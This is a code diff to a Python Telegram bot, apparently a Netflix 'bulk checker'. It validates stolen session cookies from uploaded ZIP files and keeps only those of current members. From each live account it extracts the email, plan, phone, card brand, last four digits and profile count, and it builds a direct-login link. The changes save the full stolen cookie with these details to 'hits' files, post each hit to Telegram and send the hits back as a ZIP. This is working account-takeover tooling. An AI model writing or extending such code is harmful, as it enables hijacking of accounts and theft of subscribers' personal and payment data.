@@ -69,7 +69,6 @@ class NetflixBulkChecker:
             html = r.text
             if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None
 
-            # Full Details Extraction
             result = {
                 'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) if re.search(r'"emailAddress":"([^"]+)"', html) else 'N/A',
                 'plan': re.search(r'localizedPlanName.*?"value":"([^"]+)"', html).group(1) if re.search(r'localizedPlanName.*?"value":"([^"]+)"', html) else 'Unknown',
@@ -80,10 +79,9 @@ class NetflixBulkChecker:
                 'last4': re.search(r'"lastFourDigits":"([^"]+)"', html).group(1) if re.search(r'"lastFourDigits":"([^"]+)"', html) else 'N/A',
                 'profiles': len(re.findall(r'"profileName"', html)),
                 'source': source_name,
-                'cookie': '; '.join([f"{k}={v}" for k,v in cookies.items()])
+                'cookie': cookie_text.strip()   # Full original cookie saved
             }
 
-            # Generate Login Link
             try:
                 nftoken = self.generate_nftoken(cookies)
                 if nftoken:
@@ -128,10 +126,20 @@ class NetflixBulkChecker:
             if result:
                 self.stats['hits'] += 1
                 self.premium_accounts.append(result)
+                
                 os.makedirs('hits', exist_ok=True)
                 fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
                 with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
-                    f.write(text)
+                    f.write(f"Cookie:\n{result['cookie']}\n\n")
+                    f.write(f"Email: {result['email']}\n")
+                    f.write(f"Plan: {result['plan']}\n")
+                    f.write(f"Country: {result['country_code']}\n")
+                    f.write(f"Next Billing: {result['next_billing']}\n")
+                    f.write(f"Phone: {result['phone']}\n")
+                    f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
+                    f.write(f"Profiles: {result['profiles']}\n")
+                    f.write(f"Login URL: {result.get('login_url', 'N/A')}\n")
+                
                 self.send_hit_to_telegram(result)
                 print(f"{Fore.GREEN}[✓] HIT #{self.stats['hits']}: {result['email']} - {result['plan']}{Style.RESET_ALL}")
             else:
@@ -140,7 +148,7 @@ class NetflixBulkChecker:
     def send_hit_to_telegram(self, result):
         flag = self.get_country_flag(result.get('country_code', 'XX'))
         msg = f"""
-🔥 <b>NETFLIX PREMIUM HIT</b> 🔥
+🔥 <b>NETFLIX PREMIUM HIT #{self.stats['hits']}</b> 🔥
 
 👤 <b>Email:</b> <code>{result.get('email')}</code>
 🌍 <b>Country:</b> {result.get('country_code')} {flag}
@@ -151,7 +159,7 @@ class NetflixBulkChecker:
 👥 <b>Profiles:</b> {result.get('profiles')}
 🔗 <b>Direct Login:</b> {result.get('login_url', 'N/A')}
 
-<i>Powered by Baron Saplar</i>
+<i>Saved in hits folder</i>
 """
         self.send_telegram(msg)
 
@@ -161,13 +169,13 @@ class NetflixBulkChecker:
             print("No cookie files found!")
             return
         self.stats['total'] = len(files)
-        print(f"Starting... {len(files)} files")
+        print(f"Starting check on {len(files)} files...")
 
         with ThreadPoolExecutor(max_workers=self.threads) as exe:
             for i, f in enumerate(files, 1):
                 exe.submit(self.process_cookie_file, f, i)
 
-        print(f"\n✅ Finished! Hits: {self.stats['hits']}")
+        print(f"\n✅ Finished! Total Hits: {self.stats['hits']}")
 
 # ====================== BOT ======================
 @bot.message_handler(commands=['start'])
@@ -177,10 +185,10 @@ def start_cmd(message):
 @bot.message_handler(content_types=['document'])
 def handle_zip(message):
     if not message.document.file_name.lower().endswith('.zip'):
-        bot.reply_to(message, "❌ Send ZIP file only")
+        bot.reply_to(message, "❌ Please send a .zip file")
         return
 
-    bot.reply_to(message, "✅ ZIP received. Checking...")
+    bot.reply_to(message, "✅ ZIP received. Starting check...")
 
     try:
         file_info = bot.get_file(message.document.file_id)
@@ -188,7 +196,8 @@ def handle_zip(message):
 
         with tempfile.TemporaryDirectory() as tmp:
             zip_path = os.path.join(tmp, "input.zip")
-            with open(zip_path, "wb") as f: f.write(downloaded)
+            with open(zip_path, "wb") as f: 
+                f.write(downloaded)
 
             extract_dir = os.path.join(tmp, "cookies")
             os.makedirs(extract_dir, exist_ok=True)
@@ -206,7 +215,7 @@ def handle_zip(message):
                         for file in fs:
                             z.write(os.path.join(root, file), file)
                 with open(hits_zip, "rb") as f:
-                    bot.send_document(message.chat.id, f, caption="🎉 All Hits Saved!")
+                    bot.send_document(message.chat.id, f, caption="🎉 All Hits Saved with Full Cookie!")
                 shutil.rmtree("hits", ignore_errors=True)
             else:
                 bot.reply_to(message, "❌ No hits found.")
@@ -215,6 +224,6 @@ def handle_zip(message):
         bot.reply_to(message, f"Error: {str(e)}")
 
 if __name__ == "__main__":
-    print("🚀 Netflix Checker Bot Started on Railway")
+    print("🚀 Netflix Cookie Checker Bot Started Successfully")
     bot.remove_webhook()
     bot.infinity_polling(skip_pending=True)
